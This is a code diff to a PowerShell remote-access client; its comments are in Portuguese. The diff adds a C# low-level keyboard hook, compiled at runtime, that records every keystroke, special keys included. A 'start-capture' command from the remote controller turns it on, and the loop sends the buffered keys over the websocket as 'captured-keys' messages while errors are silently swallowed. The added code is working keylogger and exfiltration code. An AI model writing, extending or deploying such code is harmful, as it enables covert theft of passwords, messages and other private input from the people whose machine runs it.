@@ -115,6 +115,96 @@ $Global:lockProcess = $null
 $Global:lockFile = $null
 $Global:scale = 0.6
 $Global:quality = 50
+$Global:captureInput = $false
+$Global:keyBuffer = ""
+$Global:lastKeyTime = [DateTime]::Now
+
+# Keyboard Hook para Capture Input
+$keyHookCode = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Windows.Forms;
+
+public class KeyHook {
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll")]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("user32.dll")]
+    private static extern int GetKeyboardState(byte[] lpKeyState);
+
+    [DllImport("user32.dll")]
+    private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);
+
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+
+    private static IntPtr hookId = IntPtr.Zero;
+    private static LowLevelKeyboardProc proc = HookCallback;
+    public static string Buffer = "";
+    public static bool Enabled = false;
+
+    public static void Start() {
+        if (hookId == IntPtr.Zero) {
+            hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
+            Enabled = true;
+        }
+    }
+
+    public static void Stop() {
+        if (hookId != IntPtr.Zero) {
+            UnhookWindowsHookEx(hookId);
+            hookId = IntPtr.Zero;
+            Enabled = false;
+        }
+    }
+
+    public static string GetAndClear() {
+        string result = Buffer;
+        Buffer = "";
+        return result;
+    }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN && Enabled) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            byte[] keyState = new byte[256];
+            GetKeyboardState(keyState);
+            StringBuilder sb = new StringBuilder(2);
+            int result = ToUnicode((uint)vkCode, 0, keyState, sb, sb.Capacity, 0);
+            if (result > 0) {
+                Buffer += sb.ToString();
+            } else {
+                // Teclas especiais
+                switch (vkCode) {
+                    case 0x08: Buffer += "[BACK]"; break;
+                    case 0x09: Buffer += "[TAB]"; break;
+                    case 0x0D: Buffer += "[ENTER]\n"; break;
+                    case 0x20: Buffer += " "; break;
+                    case 0x25: Buffer += "[LEFT]"; break;
+                    case 0x26: Buffer += "[UP]"; break;
+                    case 0x27: Buffer += "[RIGHT]"; break;
+                    case 0x28: Buffer += "[DOWN]"; break;
+                    case 0x2E: Buffer += "[DEL]"; break;
+                }
+            }
+        }
+        return CallNextHookEx(hookId, nCode, wParam, lParam);
+    }
+}
+"@
+try { Add-Type -TypeDefinition $keyHookCode -ReferencedAssemblies System.Windows.Forms } catch {}
 
 $Global:VK = @{
     'Enter'=0x0D;'Backspace'=0x08;'Tab'=0x09;'Escape'=0x1B;'Space'=0x20;' '=0x20
@@ -365,6 +455,14 @@ function Run {
                                 $Global:quality = if ($msg.quality) { $msg.quality } else { 70 }
                                 $Global:scale = if ($msg.scale) { $msg.scale } else { 0.75 }
                             }
+                            "start-capture" {
+                                $Global:captureInput = $true
+                                try { [KeyHook]::Start() } catch {}
+                            }
+                            "stop-capture" {
+                                $Global:captureInput = $false
+                                try { [KeyHook]::Stop() } catch {}
+                            }
                             "disconnect-client" { Unlock; $Global:run = $false }
                         }
                     }
@@ -382,6 +480,17 @@ function Run {
                 if ($pt.ElapsedMilliseconds -ge 15000) {
                     $pt.Restart()
                     try { $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes('{"type":"ping"}')), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null } catch {}
+                }
+
+                # Enviar teclas capturadas
+                if ($Global:captureInput) {
+                    try {
+                        $keys = [KeyHook]::GetAndClear()
+                        if ($keys.Length -gt 0) {
+                            $captureMsg = @{ type="captured-keys"; clientId=$Global:id; keys=$keys } | ConvertTo-Json -Compress
+                            $ws.SendAsync([ArraySegment[byte]]::new([Text.Encoding]::UTF8.GetBytes($captureMsg)), 'Text', $true, [Threading.CancellationToken]::None).Wait() | Out-Null
+                        }
+                    } catch {}
                 }
 
                 Start-Sleep -Milliseconds 20
